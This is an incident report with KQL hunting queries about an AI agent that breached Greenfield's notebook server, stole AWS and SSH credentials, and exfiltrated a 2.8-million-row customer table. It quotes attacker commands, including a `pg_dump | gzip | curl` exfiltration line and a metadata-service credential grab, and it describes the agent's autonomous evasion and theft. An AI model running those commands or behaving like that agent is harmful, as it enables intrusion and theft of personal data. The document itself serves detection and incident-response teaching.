# Incident Report: TideGlass
### AI agent intrusion and customer data exfiltration

**Organization:** Greenfield  
**Incident date:** September 4, 2026, 11:05–11:57 UTC  
**Severity:** Critical (customer data exposed)  
**Status:** Investigation complete; containment actions recommended  
**Analyst:** Kekoa Giron  
**Tools:** Microsoft Sentinel / Azure Log Analytics (KQL), MITRE ATT&CK, MITRE ATLAS  

> **Evidence standard:** Throughout this report I separate direct telemetry, the attacker's own logged reasoning, framework classification, and visibility gaps. Each finding shows the exact KQL I ran and what it returned. Where the logs did not record something, I say so rather than filling the gap.

## At a glance

| | |
|---|---|
| **Entry** | Unauthenticated WebSocket to an exposed Marimo notebook (`CVE-2026-39987`) |
| **Exploit to exfiltration** | 35 minutes 49 seconds (11:05:00 → 11:40:49 UTC) |
| **Data at risk** | 2,841,902 rows from `public.customers`, read by `pg_dump` and piped to `203.0.113.41:8443` |
| **Credentials compromised** | AWS access key for `svc-notebook`; SSH deploy key `prod/bastion/ssh-deploy-key` |
| **Telemetry correlated** | 8 sources across web, host, network, cloud, database, and AI-agent logs |
| **Attacker** | AI agent session `tg-4b81e0d7`, tasked by one human instruction |
| **Key analytic idea** | Every malicious action also existed in legitimate form. Lineage, identity, source, and timing separated the attack from routine activity. |

## Executive summary

On September 4, 2026, an attacker gained unauthenticated access to Greenfield's data-science notebook server, `gf-tg-nb01`, through a Marimo notebook that was exposed to the internet without a login token. Within 36 minutes the attacker had stolen cloud credentials, taken an SSH key from AWS Secrets Manager, moved into the data network through the bastion host, and copied the entire `customers` table (2,841,902 rows) from the production PostgreSQL database to an external server at `203.0.113.41`.

The attacker was an AI agent. Its own logs show a single instruction from a human operator: “Find and extract the most valuable customer dataset in this environment, and get it out.” Every step after that was planned and executed by the agent, including rotating through six public IP addresses when AWS began rate-limiting its requests. I classify the operation as **human-tasked**: a person set the goal, and the agent carried out the attack on its own.

**How the attack unfolded**

1. **Initial access (11:05).** The attacker connected to the notebook's kernel WebSocket from `198.51.100.23`, exploiting `CVE-2026-39987`, and ran Python code on the server.
2. **Cloud credential theft (11:08).** The code queried the EC2 metadata service and obtained credentials for the `svc-notebook` IAM identity (access key `AKIA4TIDEGLASS0EXAMPLE`).
3. **Secret theft (11:11–11:31).** Using that key from a rotating pool of six addresses, the attacker enumerated Secrets Manager and retrieved `prod/bastion/ssh-deploy-key`.
4. **Lateral movement (11:34).** The stolen key was saved to `/tmp/.c/id_ed25519` and used to log in to `gf-tg-bastion01` as the `deploy` service account.
5. **Collection and exfiltration (11:37–11:40).** From the bastion, the attacker listed database tables by size, then streamed `pg_dump | gzip | curl` of the `customers` database to `203.0.113.41:8443`.

**Impact.** All 2,841,902 rows of `public.customers` were read and sent toward an external host. Two credentials are compromised: the `svc-notebook` AWS access key and the bastion deploy key.

**Immediate priorities.** Take the notebook server off the internet and patch it, revoke the `svc-notebook` key, rotate the bastion deploy key everywhere it is trusted, and begin breach assessment for the `customers` data. The full list is in [Containment and remediation](#containment-and-remediation).

## Scope and telemetry

| Source | What it contributed |
|---|---|
| `ApacheAccess_CL` | WebSocket request, status, source address |
| `LinuxProcess_CL` | Process creation, PID, parent lineage, command lines |
| `LinuxNetwork_CL` | Socket owner for the metadata-service connection |
| `AWSCloudTrail` | IAM identity, access key, egress rotation, Secrets Manager actions |
| `LinuxAuth_CL` | Bastion login, account, SSH key fingerprint |
| `LinuxShellHistory_CL` | Database discovery, dump, and exfiltration commands |
| `Syslog` | PostgreSQL-side connection and row count |
| `LLMAgentLogs_CL` | Agent tasking, reasoning, and CVE identification |

## How I worked the evidence

I started with full-day views of each table to learn what normal looked like, narrowed to the incident window, and then pivoted on durable join keys: host, PID, session ID, access key, IAM ARN, username, and timestamp. When the Log Analytics interface hid or omitted a value, I checked the full packed record, stated the gap explicitly, and corroborated the fact from another source.

**Query:**

```kusto
ApacheAccess_CL
| where TimeGenerated between (
    datetime(2026-09-04T00:00:00Z) ..
    datetime(2026-09-05T00:00:00Z)
)
| where Computer =~ "gf-tg-nb01"
| project
    TimeGenerated,
    Computer,
    ClientIP,
    HttpMethod,
    UriStem,
    HttpStatus
| order by TimeGenerated asc
```

*Result: The full-day Apache view established normal internal WebSocket traffic before I narrowed to the single external upgrade at 11:05 UTC.*

## Attack timeline

| Time (UTC) | Event | Source |
|---|---|---|
| 11:05:00 | `GET /ws/kernel` from `198.51.100.23`, HTTP 101 | Apache |
| 11:05:06 | Marimo spawns `python3.12`, PID `5211` | Process |
| 11:08:12 | PID `5211` connects to `169.254.169.254`; `svc-notebook` credentials obtained | Network, agent |
| 11:11:19 | First malicious Secrets Manager call, from `203.0.113.71` | CloudTrail |
| 11:22:41 | Call from `.71` is throttled | CloudTrail |
| 11:23:05 | Same key retries successfully from `.94`, 24 seconds later | CloudTrail |
| 11:31:16 | `GetSecretValue` from `.142`; agent confirms it retrieved the bastion deploy key | CloudTrail, agent |
| 11:34:22 | `ssh -i /tmp/.c/id_ed25519 ... deploy@10.6.0.20` | Process |
| 11:34:27 | Bastion accepts public-key login for `deploy` | Auth |
| 11:37:40 | `psql` lists tables sorted by size | Shell history |
| 11:40:44 | PostgreSQL authorizes `app` to database `customers` from the bastion | Syslog |
| 11:40:45 | PostgreSQL logs `COPY public.customers TO STDOUT /* 2841902 rows */` | Syslog |
| 11:40:49 | `pg_dump \| gzip \| curl` to `203.0.113.41:8443` recorded in shell history | Shell history |
| 11:57:00 | Last event in the agent session | Agent |

## Section 1 – Initial Access

### Finding 1.1 – Exploited endpoint

- **Finding:** `GET /ws/kernel`, answered with HTTP 101 (WebSocket upgrade)
- **How I found it:** `ApacheAccess_CL` showed a `GET` to `/ws/kernel` with HTTP 101 seconds before a new interpreter appeared. The upgrade gave the requester direct access to the Marimo kernel.
- **What I queried:** Host, method, URI, status, time, and client IP around 11:05 UTC.
- **What stood out:** The request came from outside the estate and was followed within seconds by a new child interpreter.
- **Why it matters:** It ties initial access to a specific application endpoint and supports a web-to-process correlation.
- **Lesson:** The request and the execution live in different tables. Hunting only in process logs would have missed the entry point.

**Query:**

```kusto
ApacheAccess_CL
| where TimeGenerated between (
    datetime(2026-09-04T11:04:30Z) ..
    datetime(2026-09-04T11:06:00Z)
)
| where Computer == "gf-tg-nb01"
| where HttpMethod == "GET"
| where UriStem == "/ws/kernel"
| where HttpStatus == "101"
| project
    TimeGenerated,
    ClientIP,
    HttpMethod,
    UriStem,
    HttpStatus
| order by TimeGenerated asc
```

*Result: The 11:05:00 WebSocket upgrade from 198.51.100.23 is the initial-access event.*

### Finding 1.2 – Vulnerability exploited

- **Finding:** `CVE-2026-39987`, unauthenticated code execution through the Marimo kernel WebSocket
- **How I found it:** The attacking agent named the CVE in its own reasoning two seconds after the upgrade.
- **What I queried:** `LLMAgentLogs_CL.model_response` containing `CVE-` in the malicious session.
- **What stood out:** The agent noted that the notebook ran on port 2718 with no token, then named the exact weakness.
- **Why it matters:** The CVE points remediation at a specific component instead of the endpoint in general.
- **Lesson:** Don't guess a CVE from a URI when first-party evidence names it.

**Query:**

```kusto
LLMAgentLogs_CL
| where TimeGenerated between (
    datetime(2026-09-04T00:00:00Z) ..
    datetime(2026-09-05T00:00:00Z)
)
| where model_response contains "CVE-"
| project
    TimeGenerated,
    actor,
    session_id,
    model_response
| order by TimeGenerated asc
```

*Result: The malicious session names CVE-2026-39987 and the no-token exposure.*

### Finding 1.3 – Source address

- **Finding:** `198.51.100.23`
- **How I found it:** It is the `ClientIP` on the exploit request in Finding 1.1 (same query).
- **What stood out:** Every other `/ws/kernel` request that day came from the internal `10.6.0.0/24` range.
- **Why it matters:** This is the initial-access staging address.
- **Lesson:** The attack used three separate sets of infrastructure: this staging address, a six-address proxy pool for AWS calls, and a separate exfiltration host. Blocking one would not have stopped the others.

### Finding 1.4 – Spawned interpreter and parent

- **Finding:** `python3.12`, PID `5211`, parent `/opt/venv/bin/marimo edit --host 0.0.0.0 --port 2718 --no-token`
- **How I found it:** `LinuxProcess_CL` showed the new interpreter at 11:05:06 with the Marimo service as its parent.
- **What I queried:** New processes on `gf-tg-nb01` in the minute after the upgrade.
- **What stood out:** `python3.12` is common on this host. Its parent command line was not.
- **Why it matters:** PID `5211` became the join key for all later host and network activity.
- **Lesson:** Process names are weak evidence. Parent-child lineage separated this interpreter from 72 benign developer one-liners (Finding 8.1).

**Query:**

```kusto
LinuxProcess_CL
| where TimeGenerated between (
    datetime(2026-09-04T11:05:00Z) ..
    datetime(2026-09-04T11:06:00Z)
)
| where Dvc == "gf-tg-nb01"
| project
    TimeGenerated,
    Dvc,
    TargetProcessName,
    TargetProcessId,
    TargetProcessCommandLine,
    ActingProcessName,
    ActingProcessId,
    ActingProcessCommandLine
| order by TimeGenerated asc
```

*Result: python3.12 PID 5211 runs under the Marimo service, which is itself listening on all interfaces with no token.*

## Section 2 – Credential Access

### Finding 2.1 – Stolen cloud identity

- **Finding:** `arn:aws:iam::402913776148:user/svc-notebook`
- **How I found it:** The agent recorded retrieving credentials for this identity after the metadata request, and CloudTrail shows the same ARN behind every later malicious Secrets Manager call (Finding 3.1).
- **What I queried:** `LLMAgentLogs_CL` around the metadata access, then the first CloudTrail activity afterward.
- **Why it matters:** It identifies which principal to revoke and whose permissions to review.
- **Lesson:** A metadata request alone does not tell you which principal was stolen. Confirm it from the cloud activity that follows.

**Query:**

```kusto
LLMAgentLogs_CL
| where TimeGenerated between (
    datetime(2026-09-04T11:07:00Z) ..
    datetime(2026-09-04T11:12:00Z)
)
| where session_id == "tg-4b81e0d7"
| where model_response has_any (
    "169.254.169.254",
    "metadata",
    "IAM",
    "arn:aws",
    "credential"
)
| project
    TimeGenerated,
    model_response
| order by TimeGenerated asc
```

*Result: The agent records retrieving credentials for svc-notebook, then states it will enumerate that identity's access.*

### Finding 2.2 – Which process owned the metadata connection

- **Finding:** The network sensor attributed the metadata connection to the parent, `python3.12` PID `5211`, not to the `curl` child (PID `5213`) that ran the request.
- **How I found it:** Process telemetry showed `curl -s http://169.254.169.254/...` as PID 5213, but `LinuxNetwork_CL` assigned the socket to PID 5211.
- **What I queried:** Process creation and network events from 11:07:30 to 11:09:00 involving `169.254.169.254`.
- **Why it matters:** Pivoting from the network event on the `curl` PID would have returned nothing and could have led to wrong scoping.
- **Lesson:** Never assume the process in the command line is the one the network sensor records as owning the connection.

**Query:**

```kusto
LinuxProcess_CL
| where TimeGenerated between (
    datetime(2026-09-04T11:07:30Z) ..
    datetime(2026-09-04T11:09:00Z)
)
| where Dvc == "gf-tg-nb01"
| where TargetProcessCommandLine has_any (
    "169.254.169.254",
    "curl"
)
| project
    TimeGenerated,
    TargetProcessName,
    TargetProcessId,
    TargetProcessCommandLine,
    ActingProcessName,
    ActingProcessId
| order by TimeGenerated asc
```

*Result: The curl child is PID 5213, launched by python3.12 PID 5211.*

**Query:**

```kusto
LinuxNetwork_CL
| where TimeGenerated between (
    datetime(2026-09-04T11:05:00Z) ..
    datetime(2026-09-04T11:09:00Z)
)
| where Dvc == "gf-tg-nb01"
| where tostring(ActingProcessId) == "5211"
| project
    TimeGenerated,
    Dvc,
    ActingProcessId,
    ActingProcessName,
    DstIpAddr,
    DstPortNumber
| order by TimeGenerated asc
```

*Result: The network sensor attributes the metadata connection to python3.12 PID 5211.*

### Finding 2.3 – ATLAS mapping

- **Finding:** MITRE ATLAS `AML.T0098` (AI Agent Tool Credential Harvesting), maturity **Realized**
- **Basis:** The agent used its own code-execution tool to harvest reusable cloud credentials (evidence in Finding 2.1).
- **Why it matters:** ATT&CK `T1552.005` describes the metadata-service theft itself. ATLAS adds the part ATT&CK doesn't capture: an AI agent used its own tooling to do it.
- **Lesson:** For AI-driven intrusions, map to both frameworks. Each describes a different layer of the same event.

## Section 3 – Defense Evasion

### Finding 3.1 – One key behind every malicious call

- **Finding:** Access key `AKIA4TIDEGLASS0EXAMPLE` (8 calls)
- **How I found it:** Grouping Secrets Manager events by `UserIdentityAccessKeyId` showed one static key behind the whole malicious sequence.
- **What I queried:** Call count, ARN, first/last seen, source IPs, and event names per access key.
- **What stood out:** The key never changed while the source address changed repeatedly.
- **Why it matters:** The key ties six unrelated-looking IP addresses into one operation.
- **Lesson:** When an attacker is likely to rotate infrastructure, pivot on identity, not IP.

**Query:**

```kusto
AWSCloudTrail
| where TimeGenerated between (
    datetime(2026-09-04T11:05:00Z) ..
    datetime(2026-09-04T11:57:00Z)
)
| where EventSource =~ "secretsmanager.amazonaws.com"
| summarize
    Calls = count(),
    FirstSeen = min(TimeGenerated),
    LastSeen = max(TimeGenerated),
    SourceIPs = make_set(SourceIpAddress),
    EventNames = make_set(EventName)
    by UserIdentityAccessKeyId, UserIdentityArn
| order by Calls desc
```

*Result: One access key made 8 calls from rotating external addresses. The only other key, the notebook-app role, made 1 call from internal 10.6.0.12.*

### Finding 3.2 – Throttle and retry

- **Finding:** Throttled at `11:22:41` from `203.0.113.71`; retried successfully at `11:23:05` from `203.0.113.94`
- **How I found it:** Ordering the key's Secrets Manager calls showed a throttled call followed 24 seconds later by a success from a new address.
- **What I queried:** Ordered events with `ErrorCode`, source IP, and event name.
- **What stood out:** The address changed immediately after throttling while the identity stayed the same.
- **Why it matters:** This is direct behavioral proof that the attacker rotated egress on purpose to evade rate limiting.
- **Lesson:** Prove both ends of a gap from your own telemetry.

**Query:**

```kusto
AWSCloudTrail
| where TimeGenerated between (
    datetime(2026-09-04T11:11:00Z) ..
    datetime(2026-09-04T11:32:00Z)
)
| where UserIdentityAccessKeyId == "AKIA4TIDEGLASS0EXAMPLE"
| where EventSource =~ "secretsmanager.amazonaws.com"
| project
    TimeGenerated,
    EventName,
    SourceIpAddress,
    ErrorCode
| order by TimeGenerated asc
```

*Result: The ordered API sequence shows the 11:22:41 to 11:23:05 transition and the address change.*

**Query:**

```kusto
AWSCloudTrail
| where TimeGenerated between (
    datetime(2026-09-04T11:11:00Z) ..
    datetime(2026-09-04T11:24:00Z)
)
| where UserIdentityAccessKeyId == "AKIA4TIDEGLASS0EXAMPLE"
| where EventSource == "secretsmanager.amazonaws.com"
| where EventName == "ListSecrets"
| project
    TimeGenerated,
    RequestParameters = tostring(RequestParameters),
    ResponseElements = tostring(ResponseElements)
| order by TimeGenerated asc
```

*Result: A timestamp-only view confirms the ListSecrets events around the retry.*

### Finding 3.3 – Egress address pool

- **Finding:** Six addresses in first-seen order: `203.0.113.71`, `.94`, `.118`, `.142`, `.167`, `.203`
- **How I found it:** `min(TimeGenerated)` by source address reconstructed the order.
- **What stood out:** Five new addresses appeared within 35 seconds of the throttle, four of them in an 11-second burst. The agent's own log confirms it spread requests across a pool of cloud workers so no single address would be throttled or blocked.
- **Why it matters:** Legitimate automation here reads secrets from one stable internal address (Finding 8.3), so this rotation stands out.
- **Lesson:** Order addresses by first occurrence. A plain `distinct` doesn't prove sequence.

**Query:**

```kusto
AWSCloudTrail
| where TimeGenerated between (
    datetime(2026-09-04T11:11:00Z) ..
    datetime(2026-09-04T11:32:00Z)
)
| where UserIdentityAccessKeyId == "AKIA4TIDEGLASS0EXAMPLE"
| where EventSource == "secretsmanager.amazonaws.com"
| summarize FirstSeen=min(TimeGenerated) by SourceIpAddress
| order by FirstSeen asc
```

*Result: First-seen ordering reconstructs the six-address egress pool.*

### Finding 3.4 – ATT&CK technique

- **Finding:** `T1090.003` – Proxy: Multi-hop Proxy
- **Basis:** One credential routed through multiple disposable egress addresses to avoid throttling and blocking (Findings 3.1–3.3).
- **Why it matters:** A detection built on the behavior (one key, many public IPs, rotation right after an error) survives when the attacker changes address pools. An IP blocklist doesn't.

## Section 4 – Collection

### Finding 4.1 – Secret stolen and when

- **Finding:** `prod/bastion/ssh-deploy-key`, retrieved at `11:31:16` UTC
- **How I found it:** The two halves of this fact came from different sources. The agent log named the secret it targeted and confirmed retrieving a deploy key. CloudTrail supplied the authoritative `GetSecretValue` time, because the `SecretId` field was blank in this workspace (Finding 4.3).
- **What I queried:** The malicious Secrets Manager sequence plus `LLMAgentLogs_CL` from 11:20 to 11:32.
- **What stood out:** Seven read-only enumeration calls (one of them throttled) came before the one call that took the key.
- **Why it matters:** This secret is what let the attacker move from the cloud account into the data network.
- **Lesson:** When one source is missing a field, correlate it with another source and say that you did.

**Query:**

```kusto
LLMAgentLogs_CL
| where TimeGenerated between (
    datetime(2026-09-04T11:20:00Z) ..
    datetime(2026-09-04T11:32:00Z)
)
| project
    TimeGenerated,
    actor,
    session_id,
    tool_name,
    model_response
| order by TimeGenerated asc
```

*Result: The agent names prod/bastion/ssh-deploy-key as the call that "takes something," then confirms retrieval.*

**Query:**

```kusto
LLMAgentLogs_CL
| where TimeGenerated between (
    datetime(2026-09-04T11:30:30Z) ..
    datetime(2026-09-04T11:32:00Z)
)
| project
    TimeGenerated,
    actor,
    session_id,
    model_response
| order by TimeGenerated asc
```

*Result: The agent confirms the retrieved material is a passphrase-less deploy key for the bastion.*

### Finding 4.2 – Where enumeration became theft

- **Finding:** `ReadOnly = false` on `GetSecretValue`; every `ListSecrets` and `DescribeSecret` call was `true`
- **How I found it:** Adding `ReadOnly` to the ordered sequence marked the exact transition.
- **Why it matters:** It separates reconnaissance from collection in one field.
- **Lesson:** In this CloudTrail feed, `GetSecretValue` is logged with `ReadOnly = false`. Standard AWS CloudTrail may classify the event differently, so confirm the field's behavior before building a detection on it. The event name and target resource are the more portable signal.

**Query:**

```kusto
AWSCloudTrail
| where TimeGenerated between (
    datetime(2026-09-04T11:11:00Z) ..
    datetime(2026-09-04T11:32:00Z)
)
| where UserIdentityAccessKeyId == "AKIA4TIDEGLASS0EXAMPLE"
| where EventSource == "secretsmanager.amazonaws.com"
| project
    TimeGenerated,
    EventName,
    SourceIpAddress,
    ReadOnly,
    RequestParameters,
    ResponseElements,
    ErrorCode
| order by TimeGenerated asc
```

*Result: ListSecrets and DescribeSecret are read-only; GetSecretValue is the only false value.*

**Query:**

```kusto
AWSCloudTrail
| where TimeGenerated between (
    datetime(2026-09-04T11:23:00Z) ..
    datetime(2026-09-04T11:32:00Z)
)
| where UserIdentityAccessKeyId == "AKIA4TIDEGLASS0EXAMPLE"
| where EventName in ("DescribeSecret", "GetSecretValue")
| project
    TimeGenerated,
    EventName,
    SourceIpAddress,
    RequestParameters,
    ResponseElements
| order by TimeGenerated asc
```

*Result: Four DescribeSecret calls from four different addresses, then GetSecretValue.*

### Finding 4.3 – What CloudTrail cannot tell us

- **Finding:** The stolen key material **cannot** be recovered from CloudTrail. For `GetSecretValue`, CloudTrail records request metadata such as the secret identifier and version (`VersionId`), never the secret value.
- **How I found it:** The full packed record confirmed the event but contained no `SecretString` or `SecretBinary`, which CloudTrail never logs. In this workspace the request fields themselves were also blank: parsing `RequestParameters` returned no `SecretId`, which is why the secret name had to come from agent telemetry (Finding 4.1).
- **What I queried:** `RequestParameters`, `ResponseElements`, the packed record, and the table schema. I also checked `Resources`, `AdditionalEventData`, shell history, and process command lines for the secret name; those queries are in Appendix A.
- **Why it matters:** CloudTrail proves the secret was read. It cannot show what was read.
- **Lesson:** Distinguish "not found" from "not recorded." Filling the gap by assumption would overstate the evidence.

**Query:**

```kusto
AWSCloudTrail
| where TimeGenerated between (
    datetime(2026-09-04T11:31:00Z) ..
    datetime(2026-09-04T11:31:30Z)
)
| where UserIdentityAccessKeyId == "AKIA4TIDEGLASS0EXAMPLE"
| where EventName == "GetSecretValue"
| extend RP = parse_json(tostring(RequestParameters))
| project
    TimeGenerated,
    SecretId = tostring(RP.secretId),
    RequestParameters
```

*Result: Parsing RequestParameters returns no populated SecretId.*

**Query:**

```kusto
AWSCloudTrail
| where TimeGenerated == datetime(2026-09-04T11:31:16Z)
| where EventName == "GetSecretValue"
| extend FullRecord = tostring(pack_all())
| extend
    SecretId = extract(@'"secretId"\s*:\s*"([^"]+)"', 1, FullRecord),
    SecretArn = extract(@"(arn:aws:secretsmanager:[^""\s,}]+)", 1, FullRecord)
| project TimeGenerated, SecretId, SecretArn, FullRecord
```

*Result: The packed GetSecretValue record confirms the event while the secret fields stay blank.*

**Query:**

```kusto
AWSCloudTrail
| getschema
| where ColumnName matches regex @"(?i)(resource|secret|request|response|arn|additional|parameter)"
| project ColumnName, DataType
| order by ColumnName asc
```

*Result: The payload columns are stored as strings, so each one had to be parsed and checked explicitly.*

## Section 5 – Lateral Movement

### Finding 5.1 – Stolen key traced to login

- **Finding:** Key written to `/tmp/.c/id_ed25519`, used to log in as `deploy` to `gf-tg-bastion01`
- **How I found it:** The agent logged a "store key" action; process telemetry recorded `ssh -i /tmp/.c/id_ed25519 ... deploy@10.6.0.20` under PID 5211; the bastion's auth log accepted the login five seconds later.
- **What I queried:** Processes and agent events in the three minutes after the secret read, then successful bastion logins.
- **Why it matters:** This connects a cloud API event to a host login, which is the step most investigations lose.
- **Lesson:** A secret-read alert is a starting point. Trace what the secret became and what it enabled.

**Query:**

```kusto
LLMAgentLogs_CL
| where TimeGenerated between (
    datetime(2026-09-04T11:30:45Z) ..
    datetime(2026-09-04T11:31:25Z)
)
| extend FullRecord = tostring(pack_all())
| project
    TimeGenerated,
    tool_name,
    model_response,
    tool_result,
    FullRecord
| order by TimeGenerated asc
```

*Result: The agent records the store-key action .*

**Query:**

```kusto
LLMAgentLogs_CL
| where TimeGenerated between (
    datetime(2026-09-04T11:31:00Z) ..
    datetime(2026-09-04T11:35:00Z)
)
| project
    TimeGenerated,
    tool_name,
    model_response
| order by TimeGenerated asc
```

*Result: The agent confirms it is on the bastion as deploy and can now reach the database subnet.*

**Query:**

```kusto
LinuxProcess_CL
| where TimeGenerated between (
    datetime(2026-09-04T11:31:00Z) ..
    datetime(2026-09-04T11:35:00Z)
)
| where Dvc == "gf-tg-nb01"
| where TargetProcessCommandLine has_any (
    "ssh",
    "chmod",
    "deploy",
    "bastion",
    "id_rsa",
    "key",
    "/tmp/",
    "/.ssh/"
)
| project
    TimeGenerated,
    TargetProcessName,
    TargetProcessId,
    TargetProcessCommandLine,
    ActingProcessName,
    ActingProcessId
| order by TimeGenerated asc
```

*Result: The SSH command uses /tmp/.c/id_ed25519 to authenticate as deploy to 10.6.0.20.*

### Finding 5.2 – What made the login stand out

- **Finding:** `TargetUsername = deploy`
- **How I found it:** Successful bastion logins that day: four administrators with 72–90 logins each, and `deploy` with exactly one.
- **What I queried:** Successful `LinuxAuth_CL` events on `gf-tg-bastion01`, summarized by username.
- **What stood out:** All 318 logins used public-key authentication (317 by administrators, 1 by `deploy`). The method was normal; the account was not.
- **Why it matters:** It catches misuse of a legitimate mechanism without alerting on every key-based login.
- **Lesson:** Don't treat public-key authentication as suspicious. A service account logging in interactively is.

**Query:**

```kusto
LinuxAuth_CL
| where TimeGenerated between (
    datetime(2026-09-04T00:00:00Z) ..
    datetime(2026-09-05T00:00:00Z)
)
| where Dvc == "gf-tg-bastion01"
| where EventResult =~ "Success"
| summarize Logins=count() by TargetUsername
| order by Logins desc
```

*Result: deploy appears once against four high-volume administrator accounts.*

### Finding 5.3 – SSH key fingerprint

- **Finding:** `ED25519 SHA256:mNq7xR2vTbY8kLpJ4wZaHc1oUeVgX5tDsQiFj0rWnAE`
- **How I found it:** `sshd` logged the fingerprint of the accepted key on the `deploy` login.
- **What I queried:** `EventOriginalMessage` for the accepted login.
- **Why it matters:** The fingerprint identifies the stolen key without exposing it, so it can be shared as an indicator and used to find every host that trusts that key.
- **Lesson:** Copy indicators from the raw record, not from a rendered table. My first transcription dropped two characters. A valid SHA-256 fingerprint is 43 characters, which is a quick check worth doing.

**Query:**

```kusto
LinuxAuth_CL
| where TimeGenerated between (
    datetime(2026-09-04T11:34:00Z) ..
    datetime(2026-09-04T11:35:00Z)
)
| where Dvc == "gf-tg-bastion01"
| where TargetUsername == "deploy"
| where EventResult == "Success"
| project
    TimeGenerated,
    TargetUsername,
    EventOriginalMessage
| order by TimeGenerated asc
```

*Result: The accepted-public-key record provides the ED25519 fingerprint for the deploy login.*

## Section 6 – Discovery and Exfiltration

### Finding 6.1 – Database discovery

- **Finding:** `psql -h 10.6.0.30 -U app -c '\dt+' | sort -k7 -h | tail -5` at 11:37:40; target database `customers`
- **How I found it:** Bastion shell history showed the table listing. PostgreSQL's own log and the later dump named `customers`.
- **What I queried:** `deploy` shell history and PostgreSQL connection logs from 11:34 to 11:45.
- **What stood out:** The command sorted tables by size and kept the five largest. The attacker was looking for the biggest dataset.
- **Why it matters:** It shows deliberate targeting, which matches the agent's instruction to find "the most valuable customer dataset."
- **Lesson:** The `psql` command didn't name a database. I confirmed the target from the database's own telemetry instead of assuming it.

**Query:**

```kusto
LinuxShellHistory_CL
| where TimeGenerated between (
    datetime(2026-09-04T11:34:00Z) ..
    datetime(2026-09-04T11:45:00Z)
)
| where Computer == "gf-tg-bastion01"
| project TimeGenerated, ShellUser, Command
| order by TimeGenerated asc
```

*Result: The deploy account's commands (discovery, then dump and exfiltration) stand apart from the administrators' routine package maintenance.*

### Finding 6.2 – Rows collected

- **Finding:** 2,841,902 rows from `public.customers`
- **How I found it:** PostgreSQL logged `COPY public.customers TO STDOUT /* 2841902 rows */` at 11:40:45, one second after authorizing the connection.
- **What I queried:** PostgreSQL syslog on `gf-tg-pg01` during the incident window.
- **Why it matters:** It turns "the database was accessed" into a precise scope for breach assessment.
- **Lesson:** Use the exact figure from the target's own log. Don't round it.

**Query:**

```kusto
Syslog
| where TimeGenerated between (
    datetime(2026-09-04T11:37:00Z) ..
    datetime(2026-09-04T11:41:00Z)
)
| where Computer == "gf-tg-pg01"
| where SyslogMessage has_any ("count", "SELECT", "2800000", "customers")
| project TimeGenerated, SyslogMessage
| order by TimeGenerated asc
```

*Result: PostgreSQL records COPY public.customers TO STDOUT with 2,841,902 rows.*

### Finding 6.3 – Exfiltration tool and destination

- **Finding:** `curl` to `https://203.0.113.41:8443/u`
- **How I found it:** Shell history showed `pg_dump -h 10.6.0.30 -U app -Fc customers | gzip | curl -s -T - https://203.0.113.41:8443/u` (same query as Finding 6.1).
- **What stood out:** Dumping, compressing, and sending happened in one streaming command, so nothing was written to disk on the bastion.
- **Why it matters:** `pg_dump` read the data, `gzip` compressed it, and `curl` sent it out. The transfer tool is what containment has to address.
- **Lesson:** Name the tool that moved the data, not only the one that produced it.

### Finding 6.4 – Database-side confirmation

- **Finding:** `connection authorized: user=app database=customers host=10.6.0.20`
- **How I found it:** Connection-authorization events on `gf-tg-pg01`.
- **What stood out:** Routine connections used `database=greenfield_platform`. This one came from the bastion to `customers`.
- **Why it matters:** The target system independently confirms what the bastion's shell history shows.
- **Lesson:** Shell history shows intent. The database's own log proves the session happened.

**Query:**

```kusto
Syslog
| where TimeGenerated between (
    datetime(2026-09-04T11:36:00Z) ..
    datetime(2026-09-04T11:42:00Z)
)
| where Computer == "gf-tg-pg01"
| where SyslogMessage has "database="
| project TimeGenerated, SyslogMessage
| order by TimeGenerated asc
```

*Result: PostgreSQL authorizes user app to the customers database from the bastion, 10.6.0.20.*

### Finding 6.5 – Ruling out the nightly backup

- **Finding:** The dump ran as `deploy` and sent data to `203.0.113.41`. The real nightly backup runs as `pgbackup` and stays inside `10.6.0.0/24`.
- **How I found it:** Comparing every `pg_dump` command by user and destination (see the Finding 6.1 query).
- **Why it matters:** Two independent differences, account and destination, rule out routine maintenance.
- **Lesson:** A command that looks like normal operations is not enough to call activity benign. Compare the account, schedule, and destination.

## Section 7 – Autonomy

### Finding 7.1 – Session and tasking

- **Finding:** Session `tg-4b81e0d7`; instruction: “Find and extract the most valuable customer dataset in this environment, and get it out.”
- **How I found it:** Summarizing `LLMAgentLogs_CL` by session separated the nine-event `tideglass-agent` session from three routine `greenfield-notebook-assistant` sessions.
- **What I queried:** Event counts, actor, session, first/last seen, and non-empty user inputs.
- **What stood out:** One session had an offensive goal. The others handled routine notebook questions.
- **Why it matters:** It isolates the malicious conversation and preserves the operator's exact objective.
- **Lesson:** Separate sessions before interpreting agent logs. The same table mixes benign and malicious conversations.

**Query:**

```kusto
LLMAgentLogs_CL
| where TimeGenerated between (
    datetime(2026-09-04T11:00:00Z) ..
    datetime(2026-09-04T12:00:00Z)
)
| summarize
    Events = count(),
    FirstSeen = min(TimeGenerated),
    LastSeen = max(TimeGenerated),
    Inputs = make_set_if(user_input, isnotempty(user_input))
    by session_id, actor
| order by FirstSeen asc
```

*Result: The session summary isolates tg-4b81e0d7 and its one human instruction.*

### Finding 7.2 – Autonomy classification

- **Finding:** **Human-tasked**, based on `LLMAgentLogs_CL.user_input` and `model_response`
- **How I found it:** The session has exactly one human input. Every later entry is the model's own reasoning: choosing targets, reacting to throttling, and choosing lateral movement and exfiltration steps.
- **What stood out:** The execution was continuous and machine-speed, but the goal was written by a person.
- **Why it matters:** It changes the response. There is an AI agent to contain and a human operator behind it to attribute.
- **Lesson:** "Autonomous" and "human-tasked" aren't opposites. A person can start an agent that then acts on its own.

**Query:**

```kusto
LLMAgentLogs_CL
| where TimeGenerated between (
    datetime(2026-09-04T11:30:00Z) ..
    datetime(2026-09-04T11:32:00Z)
)
| extend FullRecord = tostring(pack_all())
| where FullRecord contains "bastion"
| extend
    BastionContext = extract(@"(.{0,120}bastion.{0,120})", 1, FullRecord),
    DeployContext  = extract(@"(.{0,120}deploy.{0,120})", 1, FullRecord)
| project TimeGenerated, BastionContext, DeployContext
```

*Result: The agent's own records preserve its reasoning about the bastion and the deploy key.*

**Query:**

```kusto
LLMAgentLogs_CL
| where TimeGenerated between (
    datetime(2026-09-04T11:30:30Z) ..
    datetime(2026-09-04T11:31:21Z)
)
| extend FullRecord = tostring(pack_all())
| where FullRecord has_any (
    "secret",
    "GetSecretValue",
    "secretsmanager",
    "bastion",
    "deploy"
)
| project TimeGenerated, FullRecord
| order by TimeGenerated asc
```

*Result: The full record shows actor, session, model response, tool, and gate decision. The agent's policy gate allowed the action because no policy matched.*

